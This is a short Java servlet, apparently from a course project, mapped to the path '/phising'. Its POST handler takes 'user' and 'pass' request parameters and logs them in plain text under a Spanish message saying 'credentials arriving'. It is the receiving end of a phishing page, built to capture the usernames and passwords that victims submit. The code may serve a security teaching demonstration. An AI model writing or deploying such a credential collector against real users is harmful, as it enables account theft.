package com.curso.controllers;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/phising")
public class Phising extends HttpServlet {

	public void doPost(HttpServletRequest req, HttpServletResponse resp) {
		String username = req.getParameter("user");
		String password = req.getParameter("pass");
		System.out.println("[!] Credenciales llegando: username=" + username + ", password=" + password);
	}
	
}
